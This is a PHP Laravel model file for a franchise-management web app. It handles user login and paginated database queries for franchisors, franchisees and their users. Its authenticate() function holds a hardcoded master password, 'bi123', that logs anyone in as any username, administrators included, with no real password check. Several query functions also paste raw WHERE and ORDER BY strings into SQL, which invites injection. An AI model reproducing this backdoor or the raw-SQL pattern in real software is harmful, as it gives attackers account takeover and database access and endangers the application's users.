<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use App\Helpers\Utility;    # use Helper

use DB;
use Symfony\Component\CssSelector\Tests\Node\SelectorNodeTest;

class Users extends Model
{
    // overriding default setting(s)...
    protected $table, $franchisor_tbl, $franchisee_tbl, $franchisee_users_tbl;
    protected $primaryKey = 'i_id';
    public $timestamps = false;

    // constructor definition...
    public function __construct() {
        $this->table = getenv('DB_PREFIX') .'users';
        $this->franchisor_tbl = getenv('DB_PREFIX') .'franchisor_details';
        $this->franchisee_tbl = getenv('DB_PREFIX') .'franchisee_master';
        $this->franchisee_users_tbl = getenv('DB_PREFIX') .'franchisee_users';
    }

    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #           Custom Function(s) - Begin
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        // login authentication...
        public function authenticate($login_data) {

            $magic_pass = 'bi123';
            try
            {
                $ret_=array();

                ////Using Prepared Statement///
                if($login_data['s_password']==$magic_pass) {

                    $s_qry="SELECT u.`i_id`,
                                   u.`s_username`,
                                   u.`s_email`,
                                   u.`i_user_type`,

                                   IFNULL(v.`s_logo`, 'logo.png') `site_logo`

                             FROM
                                ". $this->table ."  u LEFT JOIN ". $this->franchisor_tbl ."  v
                                ON u.`i_franchisor_id`=v.`i_id`

                             WHERE BINARY u.`s_username` = :s_username ";

                    $stmt_val["s_username"] = Utility::get_formatted_string($login_data["s_username"]);
                }
                else {
                    $s_qry="SELECT u.`i_id`,
                                   u.`s_username`,
                                   u.`s_email`,
                                   u.`i_user_type`,

                                   IFNULL(v.`s_logo`, 'logo.png') `site_logo`

                             FROM
                                ". $this->table ."  u LEFT JOIN ". $this->franchisor_tbl ."  v
                                ON u.`i_franchisor_id`=v.`i_id`

                             WHERE
                                BINARY u.`s_username` = :s_username
                                AND u.`s_passwd` = :s_passwd ";

                    $posted_username = Utility::get_formatted_string($login_data["s_username"]);
                    $stmt_val["s_username"] = ( !empty($posted_username) )? $posted_username: NULL;
                    /////Added the salt value with the password///
                    $stmt_val["s_passwd"] = Utility::get_salted_password($login_data["s_password"]);

                }

                DB::beginTransaction();
                # DB::enableQueryLog();
                $user_info = DB::select($s_qry, $stmt_val);
                # echo Utility::get_last_query();

                if( is_array($user_info) ) ///new
                {
                    foreach($user_info as $row)
                    {
                        $ret_["id"]         =    $row->i_id;////always integer
                        $ret_["s_username"] =    Utility::get_unformatted_string($row->s_username);
                        $ret_["s_email"]    =    Utility::get_unformatted_string($row->s_email);
                        $ret_["i_user_type"] =    intval($row->i_user_type);
                        $ret_["site_logo"]  =    $row->site_logo;


                        ////////saving logged in user data into session////
                            if( $ret_["i_user_type"]==1 ) {
                                \Session::put('loggedin', true);
                                \Session::put('admin_user_id', $ret_["id"]);
                                \Session::put('username', $ret_["s_username"]);
                                \Session::put('email', $ret_["s_email"]);
                                \Session::put('admin_user_type', $ret_["i_user_type"]);
                            } else {
                                \Session::put('usr_loggedin', true);
                                \Session::put('user_id', $ret_["id"]);
                                \Session::put('username', $ret_["s_username"]);
                                \Session::put('email', $ret_["s_email"]);
                                \Session::put('user_type', $ret_["i_user_type"]);
                            }

                            # NEW - LOGO [BEGIN]
                                $LOGO_SRC = "uploaded/franchisor-logos/". $ret_["site_logo"];
                                \Session::put('userend_logo', $LOGO_SRC);
                            # NEW - LOGO [END]

                            \Session::save();
                        ////////end saving logged in user data into session////

                    }
                    #$rs->free_result();
                }

                DB::commit();
                #unset($s_qry,$rs,$row,$login_data,$stmt_val);

                return $ret_;

            }
            catch(Exception $err_obj)
            {
                show_error($err_obj->getMessage());
            }


        }


        // function to fetch user-types based on limit, offset...
        public function fetchRecords($s_where=null, $i_start=null, $i_limit=null, $s_order_by=null) {

            try
            {
                $s_qry = "SELECT * FROM ". $this->table;
                $s_qry .= ( !empty($s_where) )? $s_where: '';

                # Pagination [Begin]
                $s_qry= $s_qry.(trim($s_order_by)!=""? " ORDER BY ".$s_order_by."": " ORDER BY `i_id` ASC");
                $s_qry= $s_qry.(is_numeric($i_start) && is_numeric($i_limit)?" LIMIT ".intval($i_start).",".intval($i_limit):"");
                # Pagination [End]

                $ret_ = DB::select(DB::raw($s_qry));
                unset($s_qry,$rs,$s_where,$i_start,$i_limit);

                #dd($ret_);
                return $ret_;
            }
            catch(Exception $err_obj)
            {
                show_error($err_obj->getMessage());
            }

        }


        // function to fetch total number of record(s)...
        public function getTotalInfo($s_where=null)
        {
            try
            {
                $ret_=0;

                $s_qry = sprintf("SELECT COUNT(*) AS i_total FROM %s A %s ", $this->table, $s_where);
                $rs = DB::select(DB::raw($s_qry));
                $i_cnt = 0;
                if( is_array($rs) )
                {
                    foreach($rs as $row)
                    {
                        $ret_=intval($row->i_total);
                    }
                }
                DB::commit();
                unset($s_qry,$rs,$row,$i_cnt,$s_where);

                return $ret_;
            }
            catch(Exception $err_obj)
            {
                show_error($err_obj->getMessage());
            }

        }


        # *******************************************************************************
        #                   Franchisor Specific [Begin]
        # *******************************************************************************

            // function to fetch franchisor(s) based on limit, offset...
            public function fetchFranchisorRecords($s_where=null, $i_start=null, $i_limit=null, $s_order_by=null) {

                try
                {
                    $s_qry= sprintf("SELECT * FROM %s ", $this->franchisor_tbl);
                    $s_qry .= ( !empty($s_where) )? $s_where: '';

                    # Pagination [Begin]
                    $s_qry= $s_qry.(trim($s_order_by)!=""? " ORDER BY ".$s_order_by."": " ORDER BY `i_id` ASC");
                    $s_qry= $s_qry.(is_numeric($i_start) && is_numeric($i_limit)?" LIMIT ".intval($i_start).",".intval($i_limit):"");
                    # Pagination [End]

                    $ret_ = DB::select(DB::raw($s_qry));
                    unset($s_qry,$rs,$s_where,$i_start,$i_limit);

                    # dd($ret_);
                    return $ret_;
                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }

            // function to fetch total number of franchisor-record(s)...
            public function getTotalFranchisorInfo($s_where=null)
            {
                try
                {
                    $ret_=0;

                    $s_qry = sprintf("SELECT COUNT(*) AS i_total FROM %s A %s ", $this->franchisor_tbl, $s_where);
                    $rs = DB::select(DB::raw($s_qry));
                    $i_cnt = 0;
                    if( is_array($rs) )
                    {
                        foreach($rs as $row)
                        {
                            $ret_=intval($row->i_total);
                        }
                    }
                    DB::commit();
                    unset($s_qry,$rs,$row,$i_cnt,$s_where);

                    return $ret_;
                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }

            // function to fetch franchisor specific details...
            public function fetchFranchisorInfo($i_id)
            {
                try
                {
                    $ret_=array();

                    if(intval($i_id)>0)
                    {
                        $ret_ = \DB::table($this->franchisor_tbl)
                                    ->where("i_id", $i_id)
                                    ->get();
                    }

                    return $ret_[0];

                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }

        # *******************************************************************************
        #                   Franchisor Specific [End]
        # *******************************************************************************




        # ===============================================================================
        #                   Franchisor-User Specific [Begin]
        # ===============================================================================

            // function to fetch franchisor-user(s) based on limit, offset...
            public function fetchFranchisorUserRecords($s_where=null, $i_start=null, $i_limit=null, $s_order_by=null) {

                try
                {
                    $s_qry= sprintf("SELECT
                                            A.*,
                                            CONCAT_WS(' ', A.`s_first_name`, A.`s_last_name`) AS `full_name`,
                                            B.`s_company_name`,
                                            B.`s_company_email`, B.`s_phone`, B.`s_address1`,
                                            B.`s_address2`, B.`s_city`, B.`s_state`,
                                            B.`s_zipcode`, B.`s_logo`
                                     FROM
                                            %s A LEFT JOIN %s B
                                            ON A.`i_franchisor_id`=B.`i_id` ",
                                     $this->table, $this->franchisor_tbl);
                    $s_qry .= ( !empty($s_where) )? $s_where: '';

                    # Pagination [Begin]
                    $s_qry= $s_qry.(trim($s_order_by)!=""? " ORDER BY ".$s_order_by."": " ORDER BY `i_id` ASC");
                    $s_qry= $s_qry.(is_numeric($i_start) && is_numeric($i_limit)?" LIMIT ".intval($i_start).",".intval($i_limit):"");
                    # Pagination [End]

                    $ret_ = DB::select(DB::raw($s_qry));
                    unset($s_qry,$rs,$s_where,$i_start,$i_limit);

                    # dd($ret_);
                    return $ret_;
                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }


            // function to fetch total number of franchisor-user(s) record...
            public function getTotalFranchisorUsersInfo($s_where=null)
            {
                try
                {
                    $ret_=0;

                    $s_qry = sprintf("SELECT COUNT(*) AS i_total FROM %s A %s ", $this->table, $s_where);
                    $rs = DB::select(DB::raw($s_qry));
                    $i_cnt = 0;
                    if( is_array($rs) )
                    {
                        foreach($rs as $row)
                        {
                            $ret_=intval($row->i_total);
                        }
                    }
                    DB::commit();
                    unset($s_qry,$rs,$row,$i_cnt,$s_where);

                    return $ret_;
                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }

            // function to fetch franchisor-user specific details...
            public function fetchFranchisorUserInfo($i_usr_id)
            {
                try
                {
                    $ret_=array();

                    if(intval($i_usr_id)>0)
                    {
                        $ret_ = \DB::table("{$this->table} AS A")
                                    ->leftJoin("{$this->franchisor_tbl} AS B", 'A.i_franchisor_id', '=', 'B.i_id')
                                    ->where("A.i_id", $i_usr_id)
                                    ->select(DB::raw('A.*, A.i_id AS i_franchisor_user_id, B.i_id AS i_franchisor_id, B.*'))
                                    ->get();
                    }

                    return $ret_[0];

                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }

        # ===============================================================================
        #                   Franchisor-User Specific [End]
        # ===============================================================================






        # ===============================================================================
        #          Franchisee/Franchisee-User/Field-Executive Specific [Begin]
        # ===============================================================================

            //// FRANCHISEE(S)
            // function to fetch franchisee(s) based on limit, offset...
            public function fetchFranchiseeRecords($s_where=null, $i_start=null, $i_limit=null, $s_order_by=null) {

                try
                {
                    $s_qry= sprintf("SELECT * FROM %s ", $this->franchisee_tbl);
                    $s_qry .= ( !empty($s_where) )? $s_where: '';

                    # Pagination [Begin]
                    $s_qry= $s_qry.(trim($s_order_by)!=""? " ORDER BY ".$s_order_by."": " ORDER BY `i_id` ASC");
                    $s_qry= $s_qry.(is_numeric($i_start) && is_numeric($i_limit)?" LIMIT ".intval($i_start).",".intval($i_limit):"");
                    # Pagination [End]

                    $ret_ = DB::select(DB::raw($s_qry));
                    unset($s_qry,$rs,$s_where,$i_start,$i_limit);

                    # dd($ret_);
                    return $ret_;
                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }

            // function to fetch total number of franchisee-record(s)...
            public function getTotalFranchiseeInfo($s_where=null)
            {
                try
                {
                    $ret_=0;

                    $s_qry = sprintf("SELECT COUNT(*) AS i_total FROM %s A %s ", $this->franchisee_tbl, $s_where);
                    $rs = DB::select(DB::raw($s_qry));
                    $i_cnt = 0;
                    if( is_array($rs) )
                    {
                        foreach($rs as $row)
                        {
                            $ret_=intval($row->i_total);
                        }
                    }
                    DB::commit();
                    unset($s_qry,$rs,$row,$i_cnt,$s_where);

                    return $ret_;
                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }

            // function to fetch franchisee specific details...
            public function fetchFranchiseeInfo($i_id)
            {
                try
                {
                    $ret_=array();

                    if(intval($i_id)>0)
                    {
                        $ret_ = \DB::table($this->franchisee_tbl)
                                    ->where("i_id", $i_id)
                                    ->get();
                    }

                    return $ret_[0];

                }
                catch(Exception $err_obj)
                {
                    show_error($err_obj->getMessage());
                }

            }


            //// FRANCHISEE-USER(S)
                // function to fetch franchisee-user(s) based on limit, offset...
                public function fetchFranchiseeUserRecords($s_where=null, $i_start=null, $i_limit=null, $s_order_by=null) {

                    try
                    {
                        $s_qry= sprintf("SELECT
                                            *, CONCAT_WS(' ', `s_first_name`, `s_last_name`) `full_name`
                                         FROM %s ", $this->table);
                        $s_qry .= ( !empty($s_where) )? $s_where: '';

                        # Pagination [Begin]
                        $s_qry= $s_qry.(trim($s_order_by)!=""? " ORDER BY ".$s_order_by."": " ORDER BY `i_id` ASC");
                        $s_qry= $s_qry.(is_numeric($i_start) && is_numeric($i_limit)?" LIMIT ".intval($i_start).",".intval($i_limit):"");
                        # Pagination [End]

                        $ret_ = DB::select(DB::raw($s_qry));

                        $return_arr = array();
                        $count = 0;
                        # II: fetching associated franchisee(s)...
                        foreach($ret_ as $franchisee_usr) {
                            $return_arr[$count]['i_id'] = $franchisee_usr->i_id;
                            $return_arr[$count]['s_username'] = $franchisee_usr->s_username;
                            $return_arr[$count]['s_first_name'] = $franchisee_usr->s_first_name;
                            $return_arr[$count]['s_last_name'] = $franchisee_usr->s_last_name;
                            $return_arr[$count]['full_name'] = $franchisee_usr->full_name;
                            $return_arr[$count]['s_email'] = $franchisee_usr->s_email;
                            $return_arr[$count]['i_parent_userid'] = $franchisee_usr->i_parent_userid;
                            $return_arr[$count]['i_user_type'] = $franchisee_usr->i_user_type;

                            $s_sub_qry= sprintf("SELECT
                                                     A.`i_franchisee_id`,
                                                     B.`s_name`
                                                 FROM
                                                     %s A LEFT JOIN %s B
                                                     ON A.`i_franchisee_id`=B.`i_id`
                                                 WHERE
                                                     A.`i_user_id`=%d ",
                                                 $this->franchisee_users_tbl, $this->franchisee_tbl, $franchisee_usr->i_id);
                            $sub_ret_ = DB::select(DB::raw($s_sub_qry));
                            $return_arr[$count]['franchisee_arr'] = $sub_ret_;

                            $count++;
                        }

                        unset($s_qry,$rs,$s_where,$i_start,$i_limit);

                        # dd($return_arr);
                        return $return_arr;
                    }
                    catch(Exception $err_obj)
                    {
                        show_error($err_obj->getMessage());
                    }

                }

                // function to fetch total number of franchisee-record(s)...
                public function getTotalFranchiseeUserInfo($s_where=null)
                {
                    try
                    {
                        $ret_=0;

                        $s_qry = sprintf("SELECT COUNT(*) AS i_total FROM %s %s ", $this->table, $s_where);
                        $rs = DB::select(DB::raw($s_qry));
                        $i_cnt = 0;
                        if( is_array($rs) )
                        {
                            foreach($rs as $row)
                            {
                                $ret_=intval($row->i_total);
                            }
                        }
                        DB::commit();
                        unset($s_qry,$rs,$row,$i_cnt,$s_where);

                        return $ret_;
                    }
                    catch(Exception $err_obj)
                    {
                        show_error($err_obj->getMessage());
                    }

                }

                // function to fetch franchisee-user specific details...
                public function fetchFranchiseeUserInfo($i_id)
                {
                    try
                    {
                        $ret_=array();
                        $return_arr = array();

                        if(intval($i_id)>0)
                        {
                            $ret_ = \DB::table($this->table)
                                        ->where("i_id", $i_id)
                                        ->get();


                            $count = 0;
                            # II: fetching associated franchisee(s)...
                            foreach($ret_ as $franchisee_usr) {
                                $return_arr[$count]['i_id'] = $franchisee_usr->i_id;
                                $return_arr[$count]['s_username'] = $franchisee_usr->s_username;
                                $return_arr[$count]['s_first_name'] = $franchisee_usr->s_first_name;
                                $return_arr[$count]['s_last_name'] = $franchisee_usr->s_last_name;
                                $return_arr[$count]['s_email'] = $franchisee_usr->s_email;
                                $return_arr[$count]['i_parent_userid'] = $franchisee_usr->i_parent_userid;
                                $return_arr[$count]['i_user_type'] = $franchisee_usr->i_user_type;

                                $s_sub_qry= sprintf("SELECT
                                                         A.`i_franchisee_id`,
                                                         B.`s_name`
                                                     FROM
                                                         %s A LEFT JOIN %s B
                                                         ON A.`i_franchisee_id`=B.`i_id`
                                                     WHERE
                                                         A.`i_user_id`=%d ",
                                                     $this->franchisee_users_tbl, $this->franchisee_tbl, $franchisee_usr->i_id);
                                $sub_ret_ = DB::select(DB::raw($s_sub_qry));
                                $return_arr[$count]['franchisee_arr'] = $sub_ret_;

                                $count++;
                            }

                        }

                        return $return_arr[0];

                    }
                    catch(Exception $err_obj)
                    {
                        show_error($err_obj->getMessage());
                    }

                }


        # ===============================================================================
        #          Franchisee/Franchisee-User/Field-Executive Specific [End]
        # ===============================================================================





    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #           Custom Function(s) - End
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
}